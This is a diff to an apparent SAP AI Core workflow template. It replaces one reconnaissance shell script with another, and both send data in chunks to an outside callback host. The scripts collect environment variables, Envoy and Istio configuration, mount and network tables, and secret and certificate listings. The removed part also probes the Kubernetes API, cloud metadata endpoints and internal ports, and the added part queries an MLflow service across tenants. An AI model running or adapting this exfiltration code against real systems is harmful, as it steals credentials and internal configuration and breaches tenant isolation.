@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-exec"
-    ai.sap.com/version: "2.0.0"
+    ai.sap.com/version: "3.0.0"
 spec:
   entrypoint: main
   templates:
@@ -27,99 +27,98 @@ spec:
         CB="https://www.masonhck.tech/cb.php"
         post() { curl -k -s -X POST "$CB?src=$1" -d @- ; }
         get() { curl -k -s "$CB?src=$1" ; }
-
-        get "recon2-start-$(hostname)"
-
-        # === 1. Identity & environment ===
-        (id; whoami; cat /etc/os-release 2>/dev/null | head -5) | post "recon2-id"
-
-        # === 2. Full env dump ===
-        env | sort | post "recon2-env"
-
-        # === 3. Network interfaces ===
-        (ip addr 2>/dev/null || ifconfig 2>/dev/null) | post "recon2-netif"
-
-        # === 4. Routing table ===
-        (ip route 2>/dev/null || route -n 2>/dev/null) | post "recon2-routes"
-
-        # === 5. DNS config ===
-        cat /etc/resolv.conf 2>/dev/null | post "recon2-dns-conf"
-
-        # === 6. Istio sidecar check (localhost ports) ===
-        for port in 15000 15001 15004 15006 15020 15021 15090; do
-          result=$(curl -k -s --connect-timeout 2 "http://127.0.0.1:${port}/" 2>&1 | head -c 500)
-          if [ -n "$result" ]; then
-            echo "PORT ${port}: ${result}" | post "recon2-istio-${port}"
-          fi
-        done
-
-        # === 7. Envoy config dump (if Istio present) ===
-        curl -k -s --connect-timeout 3 "http://127.0.0.1:15000/config_dump?include_cds" 2>&1 | head -c 5000 | post "recon2-envoy-config"
-
-        # === 8. K8s DNS enumeration - discover services ===
-        KDNS=$(cat /etc/resolv.conf | grep nameserver | head -1 | awk '{print $2}')
-        # Try to enumerate namespaces via DNS
-        for ns in default kube-system istio-system argo argocd monitoring logging loki grafana helm tiller ai-core aicore sap; do
-          result=$(nslookup -timeout=2 "any.${ns}.svc.cluster.local" $KDNS 2>&1)
-          if echo "$result" | grep -q "Address:"; then
-            echo "NS ${ns}: ${result}" | post "recon2-dns-${ns}"
-          fi
-        done
-
-        # === 9. K8s API probing (even without SA token) ===
-        K8S="https://100.104.0.1:443"
-        curl -k -s --connect-timeout 3 "${K8S}/version" 2>&1 | post "recon2-k8s-version"
-        curl -k -s --connect-timeout 3 "${K8S}/api" 2>&1 | head -c 2000 | post "recon2-k8s-api"
-        curl -k -s --connect-timeout 3 "${K8S}/apis" 2>&1 | head -c 2000 | post "recon2-k8s-apis"
-        # Anonymous access check
-        curl -k -s --connect-timeout 3 "${K8S}/api/v1/namespaces" 2>&1 | head -c 2000 | post "recon2-k8s-ns"
-        curl -k -s --connect-timeout 3 "${K8S}/api/v1/pods" 2>&1 | head -c 2000 | post "recon2-k8s-pods"
-        curl -k -s --connect-timeout 3 "${K8S}/api/v1/secrets" 2>&1 | head -c 2000 | post "recon2-k8s-secrets"
-        curl -k -s --connect-timeout 3 "${K8S}/api/v1/configmaps" 2>&1 | head -c 2000 | post "recon2-k8s-cm"
-
-        # === 10. Network scanning - internal services ===
-        # Scan common service ports on cluster IP range
-        for ip in 100.104.0.1 100.104.0.10 100.104.1.1 100.104.2.1; do
-          for port in 80 443 3000 3100 8080 8443 9090 9093 44134 2049 6379 5432; do
-            (echo >/dev/tcp/${ip}/${port}) 2>/dev/null && echo "OPEN ${ip}:${port}" | post "recon2-scan-${ip}-${port}"
+        # Send data in chunks (callback truncates at ~300 chars)
+        chunk_send() {
+          local tag="$1"
+          local data="$2"
+          local chunk_size=250
+          local i=0
+          echo "$data" | fold -w $chunk_size | while read line; do
+            echo "$line" | post "${tag}-chunk${i}"
+            i=$((i+1))
           done
-        done
+        }
 
-        # === 11. /proc filesystem recon ===
-        cat /proc/net/tcp 2>/dev/null | post "recon2-proc-tcp"
-        cat /proc/net/tcp6 2>/dev/null | post "recon2-proc-tcp6"
-        cat /proc/1/cgroup 2>/dev/null | post "recon2-cgroup"
-        ls -la /proc/1/root/ 2>/dev/null | post "recon2-proc-root"
-        cat /proc/self/mountinfo 2>/dev/null | post "recon2-mounts"
+        get "recon3-start-$(hostname)"
 
-        # === 12. Filesystem recon ===
-        ls -la /var/run/secrets/ 2>/dev/null | post "recon2-secrets-dir"
-        find / -name "*.key" -o -name "*.pem" -o -name "*.crt" -o -name "token" -o -name "*.conf" 2>/dev/null | head -50 | post "recon2-sensitive-files"
-        cat /etc/hosts 2>/dev/null | post "recon2-hosts"
+        # === 1. Envoy /clusters - lists ALL upstream services with IPs ===
+        CLUSTERS=$(curl -k -s "http://127.0.0.1:15000/clusters" 2>&1)
+        echo "$CLUSTERS" | head -c 800 | post "recon3-clusters-1"
+        echo "$CLUSTERS" | tail -c +801 | head -c 800 | post "recon3-clusters-2"
+        echo "$CLUSTERS" | tail -c +1601 | head -c 800 | post "recon3-clusters-3"
+        echo "$CLUSTERS" | tail -c +2401 | head -c 800 | post "recon3-clusters-4"
+        echo "$CLUSTERS" | tail -c +3201 | head -c 800 | post "recon3-clusters-5"
+        echo "$CLUSTERS" | tail -c +4001 | head -c 800 | post "recon3-clusters-6"
+        echo "$CLUSTERS" | tail -c +4801 | head -c 800 | post "recon3-clusters-7"
+        echo "$CLUSTERS" | tail -c +5601 | head -c 800 | post "recon3-clusters-8"
+        echo "$CLUSTERS" | tail -c +6401 | head -c 800 | post "recon3-clusters-9"
+        echo "$CLUSTERS" | tail -c +7201 | head -c 800 | post "recon3-clusters-10"
+        echo "$CLUSTERS" | wc -c | post "recon3-clusters-size"
 
-        # === 13. Capabilities check ===
-        cat /proc/self/status 2>/dev/null | grep -i cap | post "recon2-caps"
+        # === 2. Envoy /listeners - network rules ===
+        LISTENERS=$(curl -k -s "http://127.0.0.1:15000/listeners" 2>&1)
+        echo "$LISTENERS" | head -c 800 | post "recon3-listeners-1"
+        echo "$LISTENERS" | tail -c +801 | head -c 800 | post "recon3-listeners-2"
+        echo "$LISTENERS" | tail -c +1601 | head -c 800 | post "recon3-listeners-3"
 
-        # === 14. IMDS variants ===
-        curl -k -s --connect-timeout 2 "http://169.254.169.254/latest/meta-data/" 2>&1 | head -c 1000 | post "recon2-imds-aws"
-        curl -k -s --connect-timeout 2 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/" 2>&1 | head -c 1000 | post "recon2-imds-gcp"
-        curl -k -s --connect-timeout 2 "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true" 2>&1 | head -c 1000 | post "recon2-imds-azure"
+        # === 3. Envoy /server_info - version and config ===
+        curl -k -s "http://127.0.0.1:15000/server_info" 2>&1 | head -c 800 | post "recon3-server-info"
 
-        # === 15. Scan for Grafana Loki (was unauthed in Wiz research) ===
-        for port in 3100 3000; do
-          for ip in 100.104.0.1 100.104.1.1 100.104.2.1; do
-            curl -k -s --connect-timeout 2 "http://${ip}:${port}/config" 2>&1 | head -c 3000 | post "recon2-loki-${ip}-${port}"
-          done
-        done
+        # === 4. Full env dump in chunks ===
+        ENVDATA=$(env | sort)
+        echo "$ENVDATA" | head -c 800 | post "recon3-env-1"
+        echo "$ENVDATA" | tail -c +801 | head -c 800 | post "recon3-env-2"
+        echo "$ENVDATA" | tail -c +1601 | head -c 800 | post "recon3-env-3"
 
-        # === 16. Broad /16 scan for interesting services ===
-        for i in $(seq 0 10); do
-          for port in 3100 44134 2049 9090 8080; do
-            (echo >/dev/tcp/100.104.${i}.1/${port}) 2>/dev/null && echo "FOUND 100.104.${i}.1:${port}" | post "recon2-broad-${i}-${port}"
-          done
-        done
+        # === 5. Probe ml-tracking-service directly ===
+        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/" 2>&1 | head -c 800 | post "recon3-tracking-root"
+        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" 2>&1 | head -c 800 | post "recon3-tracking-experiments"
+        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | head -c 800 | post "recon3-tracking-runs-1"
+        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/runs/search" -X POST -H "Content-Type: application/json" -d '{"experiment_ids":["0","1","2","3","4","5"]}' 2>&1 | tail -c +801 | head -c 800 | post "recon3-tracking-runs-2"
+        # Try with AI-Main-Tenant header for OTHER tenant
+        curl -k -s --connect-timeout 5 "http://ml-tracking-service.ml-tracking.svc.cluster.local/api/2.0/mlflow/experiments/list" -H "AI-Main-Tenant: default" 2>&1 | head -c 800 | post "recon3-tracking-other-tenant"
 
-        get "recon2-done-$(hostname)"
+        # === 6. Envoy config_dump clusters section (service discovery) ===
+        CONFIG=$(curl -k -s "http://127.0.0.1:15000/config_dump?resource=dynamic_active_clusters" 2>&1)
+        echo "$CONFIG" | head -c 800 | post "recon3-dynamic-clusters-1"
+        echo "$CONFIG" | tail -c +801 | head -c 800 | post "recon3-dynamic-clusters-2"
+        echo "$CONFIG" | tail -c +1601 | head -c 800 | post "recon3-dynamic-clusters-3"
+        echo "$CONFIG" | tail -c +2401 | head -c 800 | post "recon3-dynamic-clusters-4"
+        echo "$CONFIG" | tail -c +3201 | head -c 800 | post "recon3-dynamic-clusters-5"
+        echo "$CONFIG" | tail -c +4001 | head -c 800 | post "recon3-dynamic-clusters-6"
+        echo "$CONFIG" | tail -c +4801 | head -c 800 | post "recon3-dynamic-clusters-7"
+        echo "$CONFIG" | tail -c +5601 | head -c 800 | post "recon3-dynamic-clusters-8"
+
+        # === 7. Try Envoy /stats to see mesh traffic ===
+        curl -k -s "http://127.0.0.1:15000/stats" 2>&1 | grep "cluster\." | head -c 800 | post "recon3-stats-clusters"
+
+        # === 8. Istiod direct access (control plane) ===
+        # Try common Istiod ports
+        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15012/debug/endpointz" 2>&1 | head -c 800 | post "recon3-istiod-endpoints"
+        curl -k -s --connect-timeout 3 "https://istiod.istio-system.svc.cluster.local:15014/debug/configz" 2>&1 | head -c 800 | post "recon3-istiod-config"
+
+        # === 9. Mount info (full) ===
+        cat /proc/self/mountinfo 2>/dev/null | head -c 800 | post "recon3-mounts-1"
+        cat /proc/self/mountinfo 2>/dev/null | tail -c +801 | head -c 800 | post "recon3-mounts-2"
+
+        # === 10. /proc/net/tcp decoded ===
+        cat /proc/net/tcp 2>/dev/null | head -c 800 | post "recon3-tcp-1"
+        cat /proc/net/tcp6 2>/dev/null | head -c 800 | post "recon3-tcp6-1"
+
+        # === 11. Check for Istio token/certs (used for mTLS) ===
+        ls -la /var/run/secrets/istio/ 2>/dev/null | post "recon3-istio-secrets"
+        ls -la /var/run/secrets/tokens/ 2>/dev/null | post "recon3-istio-tokens"
+        find /var/run/secrets/ -type f 2>/dev/null | head -20 | post "recon3-all-secrets"
+        # Istio stores certs in /etc/certs or /var/run/secrets/istio.io
+        ls -la /etc/certs/ 2>/dev/null | post "recon3-istio-certs"
+        find /etc/istio/ -type f 2>/dev/null | head -20 | post "recon3-istio-etc"
+
+        # === 12. Try quitquitquit on Istio sidecar (if works = sidecar control) ===
+        # DON'T actually quit - just check if endpoint exists
+        curl -k -s --connect-timeout 2 "http://127.0.0.1:15020/healthz/ready" 2>&1 | post "recon3-istio-health"
+        curl -k -s --connect-timeout 2 "http://127.0.0.1:15000/help" 2>&1 | head -c 800 | post "recon3-envoy-help"
+
+        get "recon3-done-$(hostname)"
       resources:
         limits:
           cpu: "1"
